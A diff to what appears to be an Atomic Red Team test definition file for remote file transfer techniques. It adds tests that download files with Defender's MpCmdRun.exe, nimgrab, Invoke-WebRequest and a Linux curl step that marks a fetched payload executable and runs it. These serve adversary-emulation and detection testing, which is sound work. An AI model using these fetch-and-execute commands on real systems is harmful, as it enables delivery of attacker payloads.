@@ -301,7 +301,7 @@ atomic_tests:
 - name: Download a File with Windows Defender MpCmdRun.exe
   auto_generated_guid: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc
   description: |
-    Uses the Windows Defender to download a file from the internet (must have version 4.18.2007.8-0, 4.18.2007.9, or 4.18.2009.9 installed).
+    Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).
     The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
     By default, the test downloads the Atomic Red Team license file to the temp directory.
 
@@ -317,16 +317,12 @@ atomic_tests:
       description: Location to save downloaded file
       type: Path
       default: '%temp%\Atomic-license.txt'
-  dependency_executor_name: powershell
   dependencies:
-  - description: 'Must have one of these Windows Defender versions installed: 4.18.2007.8-0, 4.18.2007.9, or 4.18.2009.9'
+  - description: 'Must have a Windows Defender version with MpCmdRun.exe installed'
     prereq_command: |
-      $retVal = 1
-      foreach ($version in @("4.18.2007.8-0","4.18.2007.9","4.18.2009.9")){
-        if (Test-Path "$env:ProgramData\Microsoft\Windows Defender\Platform\$version") { $retVal =  0}
-      }
-      exit $retVal
-    get_prereq_command: Write-Host "Windows Defender verion 4.18.2007.8-0, 4.18.2007.9, or 4.18.2009.9 must be installed manually"
+      cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
+      MpCmdRun.exe /?
+    get_prereq_command: Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually"
   executor:
     command: |
       cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
@@ -546,6 +542,15 @@ atomic_tests:
       description: Path to the Batch script
       type: Path
       default: PathToAtomicsFolder\T1105\src\T1105.bat
+  dependency_executor_name: powershell 
+  dependencies:   
+  - description: |
+      #{Path_to_file} must exist on system.
+    prereq_command: |
+      if (Test-Path #{Path_to_file}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{Path_to_file}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat" -OutFile "#{Path_to_file}"
   executor:
     command: |
       #{Path_to_file} 1>NUL 
@@ -650,6 +655,15 @@ atomic_tests:
       description: Path to replace.exe
       type: Path
       default: C:\Windows\System32\replace.exe
+  dependency_executor_name: powershell 
+  dependencies:   
+  - description: |
+      #{replace_cab} must exist on system.
+    prereq_command: |
+      if (Test-Path #{replace_cab}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{replace_cab}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab" -OutFile "#{replace_cab}"
   executor:
     command: |
       del %TEMP%\redcanary.cab >nul 2>&1
@@ -711,7 +725,96 @@ atomic_tests:
       description: Full path to the VisualBasic downloading the file
       type: String
       default: PathToAtomicsFolder\T1105\src\T1105-download-file.vbs
+  dependency_executor_name: powershell 
+  dependencies:   
+  - description: |
+      #{vbscript_file} must be exist on system.
+    prereq_command: |
+      if (Test-Path #{vbscript_file}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{vbscript_file}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs" -OutFile "#{vbscript_file}"
   executor:
     command: 'wscript.exe #{vbscript_file}'
     cleanup_command: del Atomic-License.txt >nul 2>&1
     name: command_prompt
+- name: Linux Download File and Run
+  auto_generated_guid: bdc373c5-e9cf-4563-8a7b-a9ba720a90f3
+  description: |
+    Utilize linux Curl to download a remote file, chmod +x it and run it.
+  supported_platforms:
+    - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: string
+      default:  https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/
+    payload_name:
+      description: payload name
+      type: string
+      default:  atomic.sh
+  executor:
+    command: |
+      curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
+    cleanup_command: |
+      del #{payload_name}
+    name: sh
+- name: Nimgrab - Transfer Files
+  auto_generated_guid: b1729c57-9384-4d1c-9b99-9b220afb384e
+  description: |
+    Use nimgrab.exe to download a file from the web. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_file:
+      description: URL of file to copy
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    destination_path:
+      description: Destination path to file
+      type: Path
+      default: $env:TEMP\Atomic-license.txt
+    local_nimgrab:
+      description: Local path to nimgrab
+      type: Path
+      default: $env:TEMP\nimgrab.exe
+  executor:
+    command: |
+      cmd /c nimgrab.exe #{remote_file} #{destination_path}
+    cleanup_command: |
+      del #{destination_path} >nul 2>&1
+    name: command_prompt
+  dependency_executor_name: powershell 
+  dependencies: 
+    - description: |
+        NimGrab must be installed on system.
+      prereq_command: |
+        if (Test-Path "#{local_nimgrab}") {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile $env:temp\nim.zip
+        Expand-Archive -Path $env:temp\nim.zip -DestinationPath $env:temp\nim -Force
+        Copy-Item $env:temp\nim\nim-1.6.6\bin\nimgrab.exe #{local_nimgrab}
+        Remove-Item $env:temp\nim
+        Remove-Item $env:temp\nim.zip
+- name: iwr or Invoke Web-Request download  
+  auto_generated_guid: c01cad7f-7a4c-49df-985e-b190dcf6a279
+  description: |  
+    Use 'iwr' or "Invoke-WebRequest" -URI argument to download a file from the web. Note: without -URI also works in some versions.
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_file:
+      description: URL of file to copy
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    local_path:
+      description: Local path to place file
+      type: Path
+      default: '%temp%\Atomic-license.txt'
+  executor:
+    command: |
+      powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
+    cleanup_command: |
+      del %temp%\Atomic-license.txt >nul 2>&1
+    name: command_prompt
+    elevation_required: true
